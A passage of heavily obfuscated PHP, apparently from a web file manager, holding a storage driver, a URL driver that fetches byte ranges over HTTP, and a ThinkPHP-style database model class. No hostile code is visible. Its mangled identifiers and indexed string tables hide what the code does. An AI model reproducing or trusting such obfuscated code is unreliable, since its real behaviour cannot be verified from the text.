$¶£ó¡ÍÒ = false, $ì¢Èøó = '') { parent::fileOut($ü†µ‰Øù, $°û¹¸ñ, $¶£ó¡ÍÒ, $ì¢Èøó); } public function fileOutImage($½ËÇ½–Ÿ, $ûÆé‡³³ = 250) { $Û±–…èŸ = $this->link($½ËÇ½–Ÿ . $_SERVER[•Ùç É][1532] . $ûÆé‡³³); $this->fileOutLink($Û±–…èŸ); } public function fileOutImageServer($î±àæ™Ö, $âê›Ñ–© = 250) { parent::fileOutImage($î±àæ™Ö, $âê›Ñ–©); } public function hashMd5($Ò¶·Äâ„) { $ˆİş½—… =& $_SERVER[•Ùç É]; $À„Õ¯÷“ = $this->_objectMeta($Ò¶·Äâ„); return isset($À„Õ¯÷“[$ˆİş½—…[230]]) ? $À„Õ¯÷“[$ˆİş½—…[230]] : !1; } public function size($ï‹Ûë„Õ) { $ùƒü¯²‰ = $this->objectMeta($ï‹Ûë„Õ); return $ùƒü¯²‰ ? $ùƒü¯²‰[$_SERVER[•Ùç É][78]] : 0; } public function info($—£ÒµÏĞ) { if ($this->isFolder($—£ÒµÏĞ)) { return $this->folderInfo($—£ÒµÏĞ); } else { if ($this->isFile($—£ÒµÏĞ)) { return $this->fileInfo($—£ÒµÏĞ); } } return !1; } public function exist($—€İĞà) { return $this->isFile($—€İĞà) || $this->isFolder($—€İĞà); } public function isFile($ş”¿ó¬Ú) { return !$this->isFolder($ş”¿ó¬Ú) && $this->objectMeta($ş”¿ó¬Ú); } public function isFolder($¡Øåäû) { return $this->cacheMethod($_SERVER[•Ùç É][168], $¡Øåäû); } protected function objectMeta($åí²ş÷°) { return $this->cacheMethod($_SERVER[•Ùç É][170], $åí²ş÷°); } protected function _objectMeta($êÊµ÷†ô) { $µÏ€‚¡ó =& $_SERVER[•Ùç É]; if ($êÊµ÷†ô == $µÏ€‚¡ó[12] || $êÊµ÷†ô == $µÏ€‚¡ó[8]) { return array(); } $¤ÀÓ°Œ = $this->ussRequest($êÊµ÷†ô, $µÏ€‚¡ó[1533]); if (!$¤ÀÓ°Œ[$µÏ€‚¡ó[1263]]) { return null; } $Æ¿ªÔÁ = isset($¤ÀÓ°Œ[$µÏ€‚¡ó[1253]]) ? $¤ÀÓ°Œ[$µÏ€‚¡ó[1253]] : array(); if (!isset($Æ¿ªÔÁ[$µÏ€‚¡ó[1534]])) { return null; } $šµÙÜ‹ß = array($µÏ€‚¡ó[33] => isset($Æ¿ªÔÁ[$µÏ€‚¡ó[1534]]) ? $Æ¿ªÔÁ[$µÏ€‚¡ó[1534]] : null, $µÏ€‚¡ó[78] => isset($Æ¿ªÔÁ[$µÏ€‚¡ó[1535]]) ? $Æ¿ªÔÁ[$µÏ€‚¡ó[1535]] : null, $µÏ€‚¡ó[230] => isset($Æ¿ªÔÁ[$µÏ€‚¡ó[1536]]) ? $Æ¿ªÔÁ[$µÏ€‚¡ó[1536]] : null, $µÏ€‚¡ó[1503] => isset($Æ¿ªÔÁ[$µÏ€‚¡ó[1537]]) ? $Æ¿ªÔÁ[$µÏ€‚¡ó[1537]] : null); $šµÙÜ‹ß[$µÏ€‚¡ó[1504]] = isset($Æ¿ªÔÁ[$µÏ€‚¡ó[1538]]) ? strtotime($Æ¿ªÔÁ[$µÏ€‚¡ó[1538]]) : $šµÙÜ‹ß[$µÏ€‚¡ó[1503]]; return $šµÙÜ‹ß; } protected function _isFolder($îÏøéé×) { $¬ÉŞ‰şâ =& $_SERVER[•Ùç É]; if ($îÏøéé× == $¬ÉŞ‰şâ[12] || $îÏøéé× == $¬ÉŞ‰şâ[8]) { return !0; } $İ–’æ«å = $this->_objectMeta($îÏøéé×); return isset($İ–’æ«å[$¬ÉŞ‰şâ[33]]) && $İ–’æ«å[$¬ÉŞ‰şâ[33]] == $¬ÉŞ‰şâ[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ÔÛ¼íÙÈ = false) { } public function exist($Ãä”€…Û) { $Â–şÏ»» = $this->info($Ãä”€…Û); return $Â–şÏ»»[$_SERVER[•Ùç É][218]]; } public function isFile($ùú—şÏë) { $Ì±û–› = $this->info($ùú—şÏë); return $Ì±û–›[$_SERVER[•Ùç É][218]]; } public function isFolder($ªµ‰ÃãŠ) { return !1; } public function size($ÎÈôÍÍ) { $•Ğ¨ïëş = $this->info($ÎÈôÍÍ); return $•Ğ¨ïëş[$_SERVER[•Ùç É][78]]; } public function info($Üüç€·Ò) { return $this->infoParse($Üüç€·Ò); } public function infoAuth($…¯Øœšß) { return $this->infoParse($…¯Øœšß); } public function infoWithChildren($¸±²ºĞ) { return $this->infoParse($¸±²ºĞ); } public function infoFull($¼Ï‰Ğ—) { return $this->infoParse($¼Ï‰Ğ—); } private function infoParse($–æÅ¨¤©) { $¤ñ½Ï¥ =& $_SERVER[•Ùç É]; $³Î¿Õá = $this->header($–æÅ¨¤©); if (!$³Î¿Õá || !$³Î¿Õá[$¤ñ½Ï¥[795]]) { return !1; } $§Šˆ›òÕ = _get($³Î¿Õá, $¤ñ½Ï¥[383], 0); $Œúü­Øı = array($¤ñ½Ï¥[32] => $³Î¿Õá[$¤ñ½Ï¥[32]], $¤ñ½Ï¥[86] => $–æÅ¨¤©, $¤ñ½Ï¥[33] => $¤ñ½Ï¥[216], $¤ñ½Ï¥[78] => intval($§Šˆ›òÕ), $¤ñ½Ï¥[177] => get_path_ext($³Î¿Õá[$¤ñ½Ï¥[32]]), $¤ñ½Ï¥[1415] => $§Šˆ›òÕ > 0 && $³Î¿Õá[$¤ñ½Ï¥[1539]], $¤ñ½Ï¥[1416] => !1); return $Œúü­Øı; } private function header($Ø×°æĞ) { $ù’œ°Ö =& $_SERVER[•Ùç É]; if (isset(self::$_cacheHeader[$Ø×°æĞ])) { return self::$_cacheHeader[$Ø×°æĞ]; } $Ú˜ªÏÊá = isset($GLOBALS[$ù’œ°Ö[1540]]) ? $GLOBALS[$ù’œ°Ö[1540]] : !1; $GLOBALS[$ù’œ°Ö[1540]] = !0; self::$_cacheHeader[$Ø×°æĞ] = url_header($Ø×°æĞ); $GLOBALS[$ù’œ°Ö[1540]] = $Ú˜ªÏÊá; return self::$_cacheHeader[$Ø×°æĞ]; } public function hashSimple($ÌÈ²¦„, $ğ£ç€€‡ = false) { $ÉÒÔàùÏ =& $_SERVER[•Ùç É]; $Û°¾Öªï = $this->info($ÌÈ²¦„); if (!$Û°¾Öªï || !$Û°¾Öªï[$ÉÒÔàùÏ[218]]) { return !1; } $‘êÜÈÙ = $Û°¾Öªï[$ÉÒÔàùÏ[78]]; $¡ëöé‹ = 200; $ÍÒÅéó± = 50; if ($‘êÜÈÙ <= $¡ëöé‹ * $ÍÒÅéó±) { return md5($this->fileSubstr($ÌÈ²¦„, 0, $‘êÜÈÙ)) . $‘êÜÈÙ; } $ïä¹…õ = intval($‘êÜÈÙ / $ÍÒÅéó±); $÷ùşÜ¦½ = $ÉÒÔàùÏ[12]; $¬¡ÎÖ«Ì = timeFloat(); $éøö¸µ— = 15; for ($Ü€Á•§° = 0; $Ü€Á•§° < $ÍÒÅéó±; $Ü€Á•§°++) { if (timeFloat() - $¬¡ÎÖ«Ì > $éøö¸µ—) { return !1; } $Ì¤ƒ¤Åï = $this->fileSubstr($ÌÈ²¦„, $ïä¹…õ * $Ü€Á•§°, $¡ëöé‹); if (!$Ì¤ƒ¤Åï) { return !1; } $÷ùşÜ¦½ .= $Ì¤ƒ¤Åï; } $÷ùşÜ¦½ .= $this->fileSubstr($ÌÈ²¦„, $‘êÜÈÙ - $¡ëöé‹, $¡ëöé‹); return md5($÷ùşÜ¦½) . $‘êÜÈÙ; } public function getContent($…ûËĞüç) { return $this->fileSubstr($…ûËĞüç); } public function fileSubstr($Ğ€÷®´Í, $¼¸«Â‹‡ = 0, $É›ù’ü‰ = -1) { $Ö”ù¢­Û =& $_SERVER[•Ùç É]; $…•¤ªÅè = $this->info($Ğ€÷®´Í); if (!$…•¤ªÅè || !$…•¤ªÅè[$Ö”ù¢­Û[218]] && $…•¤ªÅè[$Ö”ù¢­Û[78]] > 1024 * 1024 * 10) { return !1; } if ($É›ù’ü‰ === -1) { $É›ù’ü‰ = $…•¤ªÅè[$Ö”ù¢­Û[78]]; } if ($É›ù’ü‰ == 0) { return $Ö”ù¢­Û[12]; } $³¼ÒáÜÕ = array($Ö”ù¢­Û[1541] . $¼¸«Â‹‡ . $Ö”ù¢­Û[827] . ($¼¸«Â‹‡ + $É›ù’ü‰ - 1)); $Ö¨ğµÆí = url_request($Ğ€÷®´Í, $Ö”ù¢­Û[247], !1, $³¼ÒáÜÕ, !1, !1, 30); return $Ö¨ğµÆí[$Ö”ù¢­Û[1253]] ? $Ö¨ğµÆí[$Ö”ù¢­Û[1253]] : $Ö”ù¢­Û[12]; } public function download($à«ÔË«, $ÍÔ“çİ¦) { Downloader::start($à«ÔË«, $ÍÔ“çİ¦); return $ÍÔ“çİ¦; } } goto aë¿£®ŞƒÓ; CÀÇÉ·«: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\157\x72\144\145\162", "\x61\154\151\x61\x73", "\150\141\166\x69\156\147", "\147\162\x6f\x75\160", "\154\157\x63\x6b", "\x64\x69\x73\164\x69\x6e\x63\x74", "\141\165\x74\x6f", "\x66\151\x6c\164\x65\162", "\x76\141\x6c\x69\144\x61\x74\145", "\162\145\163\165\x6c\x74", "\142\151\156\x64", "\x74\x6f\153\x65\156"); public function __construct($áùÑ˜Èâ = '', $‘ëúéØ› = '', $åš»”Ïú = '') { $àæ–ùôÜ =& $_SERVER[•Ùç É]; $this->_initialize(); if (!empty($áùÑ˜Èâ)) { if (strpos($áùÑ˜Èâ, $àæ–ùôÜ[10])) { list($this->dbName, $this->name) = explode($àæ–ùôÜ[10], $áùÑ˜Èâ); } else { $this->name = $áùÑ˜Èâ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($‘ëúéØ›)) { $this->tablePrefix = $àæ–ùôÜ[12]; } elseif ($àæ–ùôÜ[12] != $‘ëúéØ›) { $this->tablePrefix = $‘ëúéØ›; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($àæ–ùôÜ[290]); } $this->db(0, empty($this->connection) ? $åš»”Ïú : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‰õÔ‹¢Ñ =& $_SERVER[•Ùç É]; if (empty($this->fields)) { if (think_config($‰õÔ‹¢Ñ[291])) { $ªÓÍæ³ = $this->dbName ? $this->dbName : think_config($‰õÔ‹¢Ñ[292]); $å£“‡Íâ = think_var_cache($‰õÔ‹¢Ñ[293] . strtolower(get_path_this($ªÓÍæ³) . $‰õÔ‹¢Ñ[10] . $this->name)); if ($å£“‡Íâ) { $ÖôüŒ×¢ = think_config($‰õÔ‹¢Ñ[294]); if (empty($ÖôüŒ×¢) || $å£“‡Íâ[$‰õÔ‹¢Ñ[295]] == $ÖôüŒ×¢) { $this->fields = $å£“‡Íâ; return; } } } $this->flush(); } } public function flush() { $½¸¯¾à =& $_SERVER[•Ùç É]; $this->db->setModel($this->name); $œ¸õúÂ¦ = $this->db->getFields($this->getTableName()); if (!$œ¸õúÂ¦) { return !1; } $this->fields = array_keys($œ¸õúÂ¦); $this->fields[$½¸¯¾à[296]] = !1; foreach ($œ¸õúÂ¦ as $ºŸÀ²¦» => $˜Ã¿á¦Ù) { $§áî°Êø[$ºŸÀ²¦»] = $˜Ã¿á¦Ù[$½¸¯¾à[33]]; if ($˜Ã¿á¦Ù[$½¸¯¾à[39]]) { $this->fields[$½¸¯¾à[297]] = $ºŸÀ²¦»; if ($˜Ã¿á¦Ù[$½¸¯¾à[42]]) { $this->fields[$½¸¯¾à[296]] = !0; } } } $this->fields[$½¸¯¾à[298]] = $§áî°Êø; if (think_config($½¸¯¾à[294])) { $this->fields[$½¸¯¾à[295]] = think_config($½¸¯¾à[294]); } if (think_config($½¸¯¾à[291])) { $„»ã¢›Æ = $this->dbName ? $this->dbName : think_config($½¸¯¾à[292]); think_var_cache($½¸¯¾à[293] . strtolower(get_path_this($„»ã¢›Æ) . $½¸¯¾à[10] . $this->name), $this->fields); } } public function switchModel($ñÅöƒù¿, $Û‘ÛéÑ  = array()) { $ºß¡Šñ¢ =& $_SERVER[•Ùç É]; $â´ÜÍÜì = ucwords(strtolower($ñÅöƒù¿)) . $ºß¡Šñ¢[299]; if (!class_exists($â´ÜÍÜì)) { think_exception($â´ÜÍÜì . think_lang($ºß¡Šñ¢[300])); } $this->_extModel = new $â´ÜÍÜì($this->name); if (!empty($Û‘ÛéÑ )) { foreach ($Û‘ÛéÑ  as $±îå™¿À) { $this->_extModel->setProperty($±îå™¿À, $this->{$±îå™¿À}); } } return $this->_extModel; } public function __set($È´öÆ, $éü¼«¯Å) { $this->data[$È´öÆ] = $éü¼«¯Å; } public function __get($–‰Ó§’˜) { return isset($this->data[$–‰Ó§’˜]) ? $this->data[$–‰Ó§’˜] : null; } public function __isset($Œ·Ş÷ÕÁ) { return isset($this->data[$Œ·Ş÷ÕÁ]); } public function __unset($Õ”Æô”´) { unset($this->data[$Õ”Æô”´]); } public function __call($¥Ÿ¯Ò±é, $‰‚¬ÎÉœ) { $®ñÎáæ =& $_SERVER[•Ùç É]; if (in_array(strtolower($¥Ÿ¯Ò±é), $this->methods, !0)) { $this->options[strtolower($¥Ÿ¯Ò±é)] = $‰‚¬ÎÉœ[0]; return $this; } elseif (in_array(strtolower($¥Ÿ¯Ò±é), array($®ñÎáæ[301], $®ñÎáæ[302], $®ñÎáæ[303], $®ñÎáæ[304], $®ñÎáæ[305]), !0)) { $Â‘ßÁã = isset($‰‚¬ÎÉœ[0]) ? $‰‚¬ÎÉœ[0] : $®ñÎáæ[205]; $Â‘ßÁã = $this->db->parseKey($Â‘ßÁã); return $this->getField(strtoupper($¥Ÿ¯Ò±é) . $®ñÎáæ[306] . $Â‘ßÁã . $®ñÎáæ[307] . $¥Ÿ¯Ò±é, $®ñÎáæ[301]); } elseif (strtolower(substr($¥Ÿ¯Ò±é, 0, 5)) == $®ñÎáæ[308]) { $Â‘ßÁã = think_parse_name(substr($¥Ÿ¯Ò±é, 5)); $ü®Ö›ş[$Â‘ßÁã] = $‰‚¬ÎÉœ[0]; return $this->where($ü®Ö›ş)->find(); } elseif (strtolower(substr($¥Ÿ¯Ò±é, 0, 10)) == $®ñÎáæ[309]) { $’¶ôÛÁ = think_parse_name(substr($¥Ÿ¯Ò±é, 10)); $ü®Ö›ş[$’¶ôÛÁ] = $‰‚¬ÎÉœ[0]; return $this->where($ü®Ö›ş)->getField($‰‚¬ÎÉœ[1]); } elseif (isset($this->_scope[$¥Ÿ¯Ò±é])) { return $this->scope($¥Ÿ¯Ò±é, $‰‚¬ÎÉœ[0]); } elseif (method_exists($this, $¥Ÿ¯Ò±é)) { array_unshift($‰‚¬ÎÉœ, $¥Ÿ¯Ò±é); return call_user_func_array(array($this, $®ñÎáæ[310]), $‰‚¬ÎÉœ); } else { return call_user_func_array(array(parent, $¥Ÿ¯Ò±é), $‰‚¬ÎÉœ); } } protected function call() { $›êˆØÉ— =& $_SERVER[•Ùç É]; $™§½õÌ— = func_get_args(); $î€ˆÄ¥â = array_shift($™§½õÌ—); $ÊËŠÀö = $î€ˆÄ¥â; if (is_array($î€ˆÄ¥â)) { $ÊËŠÀö = $î€ˆÄ¥â[1]; $î€ˆÄ¥â = $î€ˆÄ¥â[0]; } $¸ˆªùÜÛ = count($™§½õÌ—) - 1; if (isset($™§½õÌ—[$¸ˆªùÜÛ]) && $™§½õÌ—[$¸ˆªùÜÛ] === $î€ˆÄ¥â) { think_exception(__CLASS__ . $›êˆØÉ—[4] . $î€ˆÄ¥â . think_lang($›êˆØÉ—[311])); return; } $™§½õÌ—[] = $î€ˆÄ¥â; if (method_exists($this, $›êˆØÉ—[312])) { $œƒëİ¶Š = call_user_func_array(array($this, $›êˆØÉ—[313]), array($ÊËŠÀö, $™§½õÌ—)); if (!is_null($œƒëİ¶Š) && $œƒëİ¶Š !== !1) { return $œƒëİ¶Š; } } $å¶¨¦³³ = call_user_func_array(array($this, $î€ˆÄ¥â), $™§½õÌ—); if (method_exists($this, $›êˆØÉ—[314])) { $œƒëİ¶Š = call_user_func_array(array($this, $›êˆØÉ—[315]), array($ÊËŠÀö, $™§½õÌ—, $å¶¨¦³³)); if ($œƒëİ¶Š) { return $œƒëİ¶Š; } } return $å¶¨¦³³; } protected function _initialize() { } protected function _facade($Ë—Ãºİ) { $éú·›Áõ =& $_SERVER[•Ùç É]; if (!empty($this->fields)) { foreach ($Ë—Ãºİ as $ù–§ø¨€ => $”ı€ĞÚ¨) { if (is_array($this->fields) && !in_array($ù–§ø¨€, $this->fields, !0)) { unset($Ë—Ãºİ[$ù–§ø¨€]); } elseif (is_scalar($”ı€ĞÚ¨)) { $this->_parseType($Ë—Ãºİ, $ù–§ø¨€); } } } if (!empty($this->options[$éú·›Áõ[316]])) { $Ë—Ãºİ = array_map($this->options[$éú·›Áõ[316]], $Ë—Ãºİ); unset($this->options[$éú·›Áõ[316]]); } $this->_beforeWrite($Ë—Ãºİ); return $Ë—Ãºİ; } protected function _beforeWrite(&$öïİşèı) { } public function add($™óÜ¬¶‹ = '', $Ò¦ä† = array(), $Œ¹Š£ = false) { if (empty($™óÜ¬¶‹)) { if (!empty($this->data)) { $™óÜ¬¶‹ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[•Ùç É][317]); return !1; } } $Ò¦ä† = $this->_parseOptions($Ò¦ä†); $™óÜ¬¶‹ = $this->_facade($™óÜ¬¶‹); if (!1 === $this->_beforeInsert($™óÜ¬¶‹, $Ò¦ä†)) { return !1; } $ìÌ˜‚…‹ = $this->db->insert($™óÜ¬¶‹, $Ò¦ä†, $Œ¹Š£); if (!1 !== $ìÌ˜‚…‹) { $„ŞØÍĞÄ = $this->getLastInsID(); if ($„ŞØÍĞÄ) { $™óÜ¬¶‹[$this->getPk()] = $„ŞØÍĞÄ; $this->_after_insert($™óÜ¬¶‹, $Ò¦ä†); return $„ŞØÍĞÄ; } $this->_after_insert($™óÜ¬¶‹, $Ò¦ä†); } return $ìÌ˜‚…‹; } protected function _beforeInsert(&$Ò«Ï¢ó¡, $Ã—¤Ç¸‚) { } protected function _after_insert($ùÏĞªÅü, $Â¡¹¶¾¨) { } public function addAll($³úÙÛ„, $Ğİ†Şş† = array(), $ÕÇìùæ½ = false) { $úæøä‘ =& $_SERVER[•Ùç É]; if (empty($³úÙÛ„)) { $this->error = think_lang($úæøä‘[317]); return !1; } $Ğİ†Şş† = $this->_parseOptions($Ğİ†Şş†); foreach ($³úÙÛ„ as $ä¦ØªÂÙ => $±×æ£ÄÂ) { $³úÙÛ„[$ä¦ØªÂÙ] = $this->_facade($±×æ£ÄÂ); } if (method_exists($this->db, $úæøä‘[318])) { $²ÍÁªğ = $this->db->insertAll($³úÙÛ„, $Ğİ†Şş†, $ÕÇìùæ½); } else { $this->startTrans(); foreach ($³úÙÛ„ as $ä¦ØªÂÙ => $±×æ£ÄÂ) { $²ÍÁªğ = $this->db->insert($±×æ£ÄÂ, $Ğİ†Şş†, $ÕÇìùæ½); } $this->commit(); } if (!1 !== $²ÍÁªğ) { $éŞ´‡âÆ = $this->getLastInsID(); if ($éŞ´‡âÆ) { return $éŞ´‡âÆ; } } return $²ÍÁªğ; } public function selectAdd($‹È—”¶İ = '', $ ğ”»ñ = '', $À¸ü¡à“ = array()) { $šÅÉ¬¤ö =& $_SERVER[•Ùç É]; $À¸ü¡à“ = $this->_parseOptions($À¸ü¡à“); if (!1 === ($Œš¿ó”® = $this->db->selectInsert($‹È—”¶İ ? $‹È—”¶İ : $À¸ü¡à“[$šÅÉ¬¤ö[319]], $ ğ”»ñ ? $ ğ”»ñ : $this->getTableName(), $À¸ü¡à“))) { $this->error = think_lang($šÅÉ¬¤ö[320]); return !1; } else { return $Œš¿ó”®; } } public function save($¢¥È»÷ = '', $İÔ’´Ù = array()) { $†×èØ³Æ =& $_SERVER[•Ùç É]; if (empty($¢¥È»÷)) { if (!empty($this->data)) { $¢¥È»÷ = $this->data; $this->data = array(); } else { $this->error = think_lang($†×èØ³Æ[317]); return !1; } } $¢¥È»÷ = $this->_facade($¢¥È»÷); $İÔ’´Ù = $this->_parseOptions($İÔ’´Ù); $Á²åµä = $this->getPk(); if (!isset($İÔ’´Ù[$†×èØ³Æ[321]])) { if (isset($¢¥È»÷[$Á²åµä])) { $íÃš¤†ö[$Á²åµä] = $¢¥È»÷[$Á²åµä]; $İÔ’´Ù[$†×èØ³Æ[321]] = $íÃš¤†ö; unset($¢¥È»÷[$Á²åµä]); } else { $this->error = think_lang($†×èØ³Æ[320]); return !1; } } if (is_array($İÔ’´Ù[$†×èØ³Æ[321]]) && isset($İÔ’´Ù[$†×èØ³Æ[321]][$Á²åµä])) { $ö‹Œ«æÂ = $İÔ’´Ù[$†×èØ³Æ[321]][$Á²åµä]; } if (!1 === $this->_beforeUpdate($¢¥È»÷, $İÔ’´Ù)) { return !1; } $›˜·¼Ç¿ = $this->db->update($¢¥È»÷, $İÔ’´Ù); if (!1 !== $›˜·¼Ç¿) { if (isset($ö‹Œ«æÂ)) { $¢¥È»÷[$Á²åµä] = $ö‹Œ«æÂ; } $this->_afterUpdate($¢¥È»÷, $İÔ’´Ù); } return $›˜·¼Ç¿; } protected function _beforeUpdate(&$ïİ÷ˆÂé, $ö˜Ä ) { } protected function _afterUpdate($ö¯Ğ÷¤Ë, $Šø˜³µÃ) { } public function delete($¢¦ª–è = array()) { $±ãÊ¬Âº =& $_SERVER[•Ùç É]; if (empty($¢¦ª–è) && empty($this->options[$±ãÊ¬Âº[321]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÌĞùÖÀô = $this->getPk(); if (is_numeric($¢¦ª–è) || is_string($¢¦ª–è)) { if (strpos($¢¦ª–è, $±ãÊ¬Âº[50])) { $¢åÀÁµ[$ÌĞùÖÀô] = array($±ãÊ¬Âº[322], $¢¦ª–è); } else { $¢åÀÁµ[$ÌĞùÖÀô] = $¢¦ª–è; } $this->options[$±ãÊ¬Âº[321]] = $¢åÀÁµ; } $¢¦ª–è = $this->_parseOptions(); if (is_array($¢¦ª–è[$±ãÊ¬Âº[321]]) && isset($¢¦ª–è[$±ãÊ¬Âº[321]][$ÌĞùÖÀô])) { $á¢ßò¶ª = $¢¦ª–è[$±ãÊ¬Âº[321]][$ÌĞùÖÀô]; } $µ¸„¡æ’ = $this->db->delete($¢¦ª–è); if (!1 !== $µ¸„¡æ’) { $ÅâËŒù = array(); if (isset($á¢ßò¶ª)) { $ÅâËŒù[$ÌĞùÖÀô] = $á¢ßò¶ª; } $this->_after_delete($ÅâËŒù, $¢¦ª–è); } return $µ¸„¡æ’; } protected function _after_delete($ŒÂÚ’Å, $Ö·íŒíŞ) { } public function select($ÜÙÎÒ†¹ = array()) { $­»‚éÂ· =& $_SERVER[•Ùç É]; if (is_string($ÜÙÎÒ†¹) || is_numeric($ÜÙÎÒ†¹)) { $ÈÔ–ØÇ’ = $this->getPk(); if (strpos($ÜÙÎÒ†¹, $­»‚éÂ·[50])) { $¿ØÀ°ë[$ÈÔ–ØÇ’] = array($­»‚éÂ·[322], $ÜÙÎÒ†¹); } else { $¿ØÀ°ë[$ÈÔ–ØÇ’] = $ÜÙÎÒ†¹; } $this->options[$­»‚éÂ·[321]] = $¿ØÀ°ë; } elseif (!1 === $ÜÙÎÒ†¹) { $ÜÙÎÒ†¹ = $this->_parseOptions(); return $­»‚éÂ·[323] . $this->db->buildSelectSql($ÜÙÎÒ†¹) . $­»‚éÂ·[324]; } $ÜÙÎÒ†¹ = $this->_parseOptions(); $åğøí±Ç = $this->db->select($ÜÙÎÒ†¹); if (!1 === $åğøí±Ç) { return !1; } if (empty($åğøí±Ç)) { return null; } $this->_afterSelect($åğøí±Ç, $ÜÙÎÒ†¹); return $åğøí±Ç; } protected function _afterSelect(&$°¸Ë® °, $©œÀæ¦†) { } public function buildSql($¶ãÉÚüå = array()) { $åşÇ¬•™ =& $_SERVER[•Ùç É]; $¶ãÉÚüå = $this->_parseOptions($¶ãÉÚüå); return $åşÇ¬•™[323] . $this->db->buildSelectSql($¶ãÉÚüå) . $åşÇ¬•™[324]; } public function optionsValue($¯ò¨íÃ¿ = null) { if (is_null($¯ò¨íÃ¿)) { return $this->options; } elseif (is_array($¯ò¨íÃ¿)) { $this->options = array_merge($this->options, $¯ò¨íÃ¿); } } protected function _parseOptions($ÖíëÍİ· = array()) { $Ğğãîñ =& $_SERVER[•Ùç É]; if (is_array($ÖíëÍİ·)) { $ÖíëÍİ· = array_merge($this->options, $ÖíëÍİ·); } $this->options = array(); if (!isset($ÖíëÍİ·[$Ğğãîñ[325]])) { $ÖíëÍİ·[$Ğğãîñ[325]] = $this->getTableName(); $ê¯şÚšÆ = $this->fields; } else { $ê¯şÚšÆ = $this->getDbFields(); } if (!empty($ÖíëÍİ·[$Ğğãîñ[326]])) { $ÖíëÍİ·[$Ğğãîñ[325]] .= $Ğğãîñ[53] . $ÖíëÍİ·[$Ğğãîñ[326]]; } $ÖíëÍİ·[$Ğğãîñ[327]] = $this->name; if (isset($ÖíëÍİ·[$Ğğãîñ[321]]) && is_array($ÖíëÍİ·[$Ğğãîñ[321]]) && !empty($ê¯şÚšÆ) && !isset($ÖíëÍİ·[$Ğğãîñ[328]]) && !isset($ÖíëÍİ·[$Ğğãîñ[325]])) { foreach ($ÖíëÍİ·[$Ğğãîñ[321]] as $ÅÛ•ÙšÓ => $»ü–•Üù) { $ÅÛ•ÙšÓ = trim($ÅÛ•ÙšÓ); if (in_array($ÅÛ•ÙšÓ, $ê¯şÚšÆ, !0)) { if (is_scalar($»ü–•Üù)) { $this->_parseType($ÖíëÍİ·[$Ğğãîñ[321]], $ÅÛ•ÙšÓ); } } elseif (!is_numeric($ÅÛ•ÙšÓ) && $Ğğãîñ[11] != substr($ÅÛ•ÙšÓ, 0, 1) && !1 === strpos($ÅÛ•ÙšÓ, $Ğğãîñ[10]) && !1 === strpos($ÅÛ•ÙšÓ, $Ğğãîñ[306]) && !1 === strpos($ÅÛ•ÙšÓ, $Ğğãîñ[329]) && !1 === strpos($ÅÛ•ÙšÓ, $Ğğãîñ[330])) { unset($ÖíëÍİ·[$Ğğãîñ[321]][$ÅÛ•ÙšÓ]); } } } $this->_options_filter($ÖíëÍİ·); return $ÖíëÍİ·; } protected function _options_filter(&$•âøâØ) { } protected function _parseType(&$ÒºèĞø, $úÒüà©¶) { $Âøã´³ =& $_SERVER[•Ùç É]; if (empty($this->options[$Âøã´³[331]][$Âøã´³[4] . $úÒüà©¶])) { $ªÁ€öÒ€ = strtolower($this->fields[$Âøã´³[298]][$úÒüà©¶]); if (!1 !== strpos($ªÁ€öÒ€, $Âøã´³[332])) { } elseif (!1 === strpos($ªÁ€öÒ€, $Âøã´³[333]) && !1 !== strpos($ªÁ€öÒ€, $Âøã´³[334])) { $ÒºèĞø[$úÒüà©¶] = intval($ÒºèĞø[$úÒüà©¶]); } elseif (!1 !== strpos($ªÁ€öÒ€, $Âøã´³[335]) || !1 !== strpos($ªÁ€öÒ€, $Âøã´³[336])) { $ÒºèĞø[$úÒüà©¶] = floatval($ÒºèĞø[$úÒüà©¶]); } elseif (!1 !== strpos($ªÁ€öÒ€, $Âøã´³[337])) { $ÒºèĞø[$úÒüà©¶] = (bool) $ÒºèĞø[$úÒüà©¶]; } } } public function find($ò¬¥¢®İ = array()) { $ì÷”« =& $_SERVER[•Ùç É]; if (is_numeric($ò¬¥¢®İ) || is_string($ò¬¥¢®İ)) { $åºƒˆå’[$this->getPk()] = intval($ò¬¥¢®İ); $this->options[$ì÷”«[321]] = $åºƒˆå’; } $this->options[$ì÷”«[338]] = 1; $ò¬¥¢®İ = $this->_parseOptions(); $¨ŒÑ×†¾ = $this->db->select($ò¬¥¢®İ); if (!1 === $¨ŒÑ×†¾) { return !1; } if (empty($¨ŒÑ×†¾)) { return null; } $this->data = $¨ŒÑ×†¾[0]; $this->_afterFind($this->data, $ò¬¥¢®İ); if (!empty($this->options[$ì÷”«[339]])) { return $this->returnResult($this->data, $this->options[$ì÷”«[339]]); } return $this->data; } protected function _afterFind(&$äÏÅ³¯, $Ù­ç÷) { } protected function returnResult($Ùº­ è, $÷¶³Œæà = '') { $—æ—­¢Ğ =& $_SERVER[•Ùç É]; if ($÷¶³Œæà) { if (is_callable($÷¶³Œæà)) { return call_user_func($÷¶³Œæà, $Ùº­ è); } switch (strtolower($÷¶³Œæà)) { case $—æ—­¢Ğ[340]: return json_encode($Ùº­ è); case $—æ—­¢Ğ[341]: return xml_encode($Ùº­ è); } } return $Ùº­ è; } public function parseFieldsMap($ÍÛÊÛ±í, $‘Æ¶×©Û = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¢Î…Æä¶ => $€¬±’) { if ($‘Æ¶×©Û == 1) { if (isset($ÍÛÊÛ±í[$€¬±’])) { $ÍÛÊÛ±í[$¢Î…Æä¶] = $ÍÛÊÛ±í[$€¬±’]; unset($ÍÛÊÛ±í[$€¬±’]); } } else { if (isset($ÍÛÊÛ±í[$¢Î…Æä¶])) { $ÍÛÊÛ±í[$€¬±’] = $ÍÛÊÛ±í[$¢Î…Æä¶]; 